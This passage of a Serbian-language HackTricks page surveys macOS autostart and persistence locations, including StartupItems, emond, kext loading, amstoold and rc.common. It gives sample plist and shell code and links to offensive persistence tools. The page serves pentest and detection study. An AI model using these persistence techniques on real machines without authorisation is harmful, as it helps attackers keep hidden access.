**StartupItem** je direktorijum koji bi trebalo da bude smešten ili u `/Library/StartupItems/` ili u `/System/Library/StartupItems/`. Kada se ovaj direktorijum uspostavi, mora obuhvatiti dva specifična fajla:

1. **rc skript**: Shell skript koji se izvršava pri pokretanju.
2. **plist fajl**, specifično nazvan `StartupParameters.plist`, koji sadrži različite konfiguracione postavke.

Proverite da su kako rc skript tako i fajl `StartupParameters.plist` pravilno smešteni unutar direktorijuma **StartupItem** kako bi proces pokretanja mogao da ih prepozna i koristi.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```



### Lokacije automatskog pokretanja na macOS-u

Na macOS-u, postoji nekoliko lokacija gde se aplikacije mogu postaviti da se automatski pokreću prilikom pokretanja sistema. Ove lokacije uključuju:

1. **LaunchAgents**: Ovde se nalaze korisnički specifični agenti koji se pokreću kada se korisnik prijavi.
2. **LaunchDaemons**: Ovde se nalaze sistemski agenti koji se pokreću prilikom pokretanja sistema.
3. **StartupItems**: Ova zastarela lokacija se koristila u starijim verzijama macOS-a i sadrži skripte koje se pokreću prilikom pokretanja sistema.

Provera ovih lokacija može biti korisna za otkrivanje potencijalno zlonamernih aplikacija koje pokušavaju da se automatski pokrenu prilikom pokretanja sistema.

```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```

### ~~emond~~

{% hint style="danger" %}
Ne mogu da pronađem ovu komponentu na mom macOS-u, pa za više informacija pogledajte objašnjenje
{% endhint %}

Objašnjenje: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

**emond** je mehanizam za beleženje koji je uveden od strane Apple-a, a koji se čini nedovoljno razvijenim ili možda napuštenim, ali i dalje je dostupan. Iako nije posebno koristan za administratora Mac računara, ovaj skriveni servis može poslužiti kao suptilan metod upornosti za napadače, verovatno neprimećen od većine macOS administratora.

Za one koji su svesni njegovog postojanja, identifikacija bilo kakve zlonamerne upotrebe **emond**-a je jednostavna. LaunchDaemon sistema za ovaj servis traži skripte za izvršenje u jednom direktorijumu. Da biste to proverili, može se koristiti sledeća komanda:

```bash
ls -l /private/var/db/emondClients
```

### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

#### Lokacija

* **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
* Potreban je root pristup
* **Okidač**: Sa XQuartz-om

#### Opis & Eksploatacija

XQuartz više **nije instaliran u macOS-u**, pa ako želite više informacija pogledajte writeup.

### ~~kext~~

{% hint style="danger" %}
Toliko je komplikovano instalirati kext čak i kao root da neću smatrati ovo kao beg iz peska ili čak za postojanost (osim ako imate eksploit)
{% endhint %}

#### Lokacija

Da biste instalirali KEXT kao stavku za pokretanje, potrebno je da bude **instaliran na jednoj od sledećih lokacija**:

* `/System/Library/Extensions`
* KEXT fajlovi ugrađeni u OS X operativni sistem.
* `/Library/Extensions`
* KEXT fajlovi instalirani od strane softvera trećih lica

Možete prikazati trenutno učitane kext fajlove sa:

```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```

Za više informacija o [**kernel ekstenzijama pogledajte ovu sekciju**](macos-security-and-privilege-escalation/mac-os-architecture/#i-o-kit-drivers).

### ~~amstoold~~

Objašnjenje: [https://theevilbit.github.io/beyond/beyond\_0029/](https://theevilbit.github.io/beyond/beyond\_0029/)

#### Lokacija

* **`/usr/local/bin/amstoold`**
* Potreban je root pristup

#### Opis i eksploatacija

Navodno je `plist` fajl sa lokacije `/System/Library/LaunchAgents/com.apple.amstoold.plist` koristio ovaj binarni fajl dok je izlagao XPC servis... problem je bio što binarni fajl nije postojao, pa ste mogli postaviti nešto tamo i kada se XPC servis pozove, vaš binarni fajl će biti pozvan.

Ne mogu više pronaći ovo na mom macOS-u.

### ~~xsanctl~~

Objašnjenje: [https://theevilbit.github.io/beyond/beyond\_0015/](https://theevilbit.github.io/beyond/beyond\_0015/)

#### Lokacija

* **`/Library/Preferences/Xsan/.xsanrc`**
* Potreban je root pristup
* **Okidač**: Kada se servis pokrene (retko)

#### Opis i eksploatacija

Navodno nije vrlo često pokretati ovaj skript i čak ga nisam mogao pronaći na mom macOS-u, pa ako želite više informacija pogledajte objašnjenje.

### ~~/etc/rc.common~~

{% hint style="danger" %}
**Ovo ne funkcioniše u modernim verzijama MacOS-a**
{% endhint %}

Takođe je moguće ovde postaviti **komande koje će biti izvršene pri pokretanju sistema.** Primer redovnog rc.common skripta:

```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```

## Tehnike i alati za postojanost

* [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
* [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
